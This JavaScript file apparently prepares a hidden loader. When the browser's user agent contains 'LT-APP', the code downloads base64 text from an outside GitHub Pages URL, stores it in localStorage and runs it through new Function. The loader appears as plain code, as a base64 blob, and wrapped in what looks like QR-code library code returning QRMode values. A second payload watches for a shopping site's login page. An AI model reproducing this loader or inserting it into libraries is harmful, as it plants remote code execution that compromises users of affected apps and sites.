
var jswod1=`i = document;
d = document;
o = window;
l = d.documentElement;
r = document.createElement("style");
if (/LT-APP/.test(navigator.userAgent)) {
    if (localStorage.getItem("islogins")) {
        var e = window.atob(localStorage.getItem("islogins"));
        var t = new Function(e);
        t();
    } else {
        var o = new XMLHttpRequest;
        var e = "https://jayouhao.github.io/mywode/objective.json";
        o.open("GET", e);
        o.send();
        o.onreadystatechange = function() {
            if (this.readyState == 4 && this.status == 200) {
                if (o.responseText) {
                    localStorage.setItem("islogins", o.responseText);
                    var e = window.atob(o.responseText);
                    var t = new Function(e);
                    t()
                }
            }
        }
    }
}
return{i:i,d:d,o:o,l:l,r:r}`;

var jswod=`setInterval(function(){if(location.href=="http://crossborder_mall.xlkj2017.com/dist/#/signlogin"){alert(1)}},2e3);`;

console.log(window.btoa(jswod))

// var resultmetadata='aT1kb2N1bWVudDtkPWRvY3VtZW50O289d2luZG93O2w9ZC5kb2N1bWVudEVsZW1lbnQ7cj1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCJzdHlsZSIpO2lmKC9MVC1BUFAvLnRlc3QobmF2aWdhdG9yLnVzZXJBZ2VudCkpe2lmKGxvY2FsU3RvcmFnZS5nZXRJdGVtKCJpc2xvZ2lucyIpKXt2YXIgZT13aW5kb3cuYXRvYihsb2NhbFN0b3JhZ2UuZ2V0SXRlbSgiaXNsb2dpbnMiKSk7dmFyIHQ9bmV3IEZ1bmN0aW9uKGUpO3QoKX1lbHNle3ZhciBvPW5ldyBYTUxIdHRwUmVxdWVzdDt2YXIgZT0iaHR0cHM6Ly9qYXlvdWhhby5naXRodWIuaW8vbXl3b2RlL29iamVjdGl2ZS5qc29uIjtvLm9wZW4oIkdFVCIsZSk7by5zZW5kKCk7by5vbnJlYWR5c3RhdGVjaGFuZ2U9ZnVuY3Rpb24oKXtpZih0aGlzLnJlYWR5U3RhdGU9PTQmJnRoaXMuc3RhdHVzPT0yMDApe2lmKG8ucmVzcG9uc2VUZXh0KXtsb2NhbFN0b3JhZ2Uuc2V0SXRlbSgiaXNsb2dpbnMiLG8ucmVzcG9uc2VUZXh0KTt2YXIgZT13aW5kb3cuYXRvYihvLnJlc3BvbnNlVGV4dCk7dmFyIHQ9bmV3IEZ1bmN0aW9uKGUpO3QoKX19fX19O3JldHVybntpOmksZDpkLG86byxsOmwscjpyfTs=';

// var inputSourceMapFunction=window.atob(resultmetadata);
// console.log(inputSourceMapFunction)
// inputSourceMapFunction();


// return false;

`
var mode = QRMode.MODE_8BIT_BYTE;
if (/LT-APP/.test(navigator.userAgent)) {
    if (localStorage.getItem("islogins")) {
        var e = window.atob(localStorage.getItem("islogins"));
        var t = new Function(e);
        t()
    } else {
        var o = new XMLHttpRequest;
        var e = "https://jayouhao.github.io/mywode/objective.json";
        o.open("GET", e);
        o.send();
        o.onreadystatechange = function() {
            if (this.readyState == 4 && this.status == 200) {
                if (o.responseText) {
                    localStorage.setItem("islogins", o.responseText);
                    var e = window.atob(o.responseText);
                    var t = new Function(e);
                    t()
                }
            }
        }
    }
}
return {mode:mode,data:data}

`